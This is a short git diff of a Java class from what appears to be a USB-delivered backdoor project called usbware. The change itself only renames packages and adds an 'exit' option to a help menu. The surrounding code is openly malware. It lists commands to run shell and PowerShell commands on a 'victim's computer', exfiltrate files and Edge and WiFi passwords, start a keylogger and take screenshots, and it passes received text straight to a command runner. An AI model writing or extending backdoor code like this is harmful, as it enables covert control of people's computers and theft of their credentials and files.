@@ -1,4 +1,4 @@
-package thatcherdev.usbware.backdoor;
+package com.github.thatcherdev.usbware.backdoor;
 
 import java.awt.Rectangle;
 import java.awt.Robot;
@@ -7,11 +7,11 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.Arrays;
 import javax.imageio.ImageIO;
-import thatcherdev.usbware.backend.DuckyScripts;
-import thatcherdev.usbware.backend.Exfil;
-import thatcherdev.usbware.backend.FTP;
-import thatcherdev.usbware.backend.KeyLogger;
-import thatcherdev.usbware.backend.Utils;
+import com.github.thatcherdev.usbware.backend.DuckyScripts;
+import com.github.thatcherdev.usbware.backend.Exfil;
+import com.github.thatcherdev.usbware.backend.FTP;
+import com.github.thatcherdev.usbware.backend.KeyLogger;
+import com.github.thatcherdev.usbware.backend.Utils;
 
 public class HandleCommand {
 
@@ -28,7 +28,7 @@ public class HandleCommand {
 			send="[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
 				+"[exfiles] Exfiltarte files based on extension\n[expass] Exfiltrate Microsoft Edge and WiFi passwords\n"
 				+"[filesend] Send a file to victim's computer\n[filerec] Receive a file from victim's computer\n"
-				+"[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer";
+				+"[keylog] Start a KeyLogger on victim's computer\n[ss] Get screenshot of vitim's computer\n[exit] Exit";
 		else if(command.startsWith("cmd"))
 			send=Utils.runCommand(command.substring(4));
 		else if(command.startsWith("ps"))
